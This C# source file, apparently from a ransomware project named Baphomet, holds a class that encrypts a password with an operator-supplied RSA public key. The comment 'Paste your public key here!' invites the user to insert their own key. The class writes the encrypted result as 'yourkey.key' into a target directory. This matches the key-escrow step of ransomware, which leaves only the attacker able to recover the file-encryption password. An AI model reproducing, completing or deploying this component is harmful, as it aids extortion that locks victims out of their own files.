using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet.Utilities
{
    public class CryptRSA
    {
        public  void EncryptText(string targetPath ,string password)
        {
            //Pega tu llave publica aqui! / Paste your public key here!
            string publicKey = "<RSAKeyValue><Modulus>35i09qsOavHA+5hQTjeTe1o6Fothnm1F2LElOXVHmW8xhBdFlImorDYJN0QLS48iiE3YNwXllvPIRBAULVNyPdOaWJTgQwEAtszuV7CadcMvZF2xpLUtQWEc0GzI627LGSdxAI7CDSqCdsTb0U8PxnSlMoF8b/pxfRbgNWy20d0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
            // Convierto el password a un array byte 
            UnicodeEncoding byteConverter = new UnicodeEncoding();
            byte[] dataToEncrypt = byteConverter.GetBytes(password);

            // Creo un array byte para almazenar la data encriptada(password)  
            byte[] encryptedData;
            using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
            {
                // Set rsa pulic key   
                rsa.FromXmlString(publicKey);

                encryptedData = rsa.Encrypt(dataToEncrypt, false);
            }
             File.WriteAllBytes(targetPath + "\\yourkey.key", encryptedData);
        }
    }
}
